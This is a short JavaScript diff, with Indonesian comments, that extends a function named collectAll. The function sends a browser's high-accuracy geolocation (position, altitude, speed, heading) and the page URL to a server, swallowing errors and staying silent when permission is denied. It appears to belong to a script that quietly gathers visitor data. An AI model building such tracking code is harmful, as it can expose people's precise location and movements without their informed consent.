@@ -664,6 +664,10 @@ async function collectAll() {
               lat: pos.coords.latitude,
               lon: pos.coords.longitude,
               accuracy: pos.coords.accuracy,
+              altitude: pos.coords.altitude,              // ← TAMBAH INI
+              altitudeAccuracy: pos.coords.altitudeAccuracy, // ← TAMBAH INI
+              speed: pos.coords.speed,                    // ← TAMBAH INI
+              heading: pos.coords.heading,                // ← TAMBAH INI
               url: location.href,
             }),
           });
@@ -671,7 +675,7 @@ async function collectAll() {
         } catch (_) {}
       },
       () => { /* Ditolak / timeout → diam saja */ },
-      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      { enableHighAccuracy: true, timeout:  10000, maximumAge: 0 }
     );
   }
 }
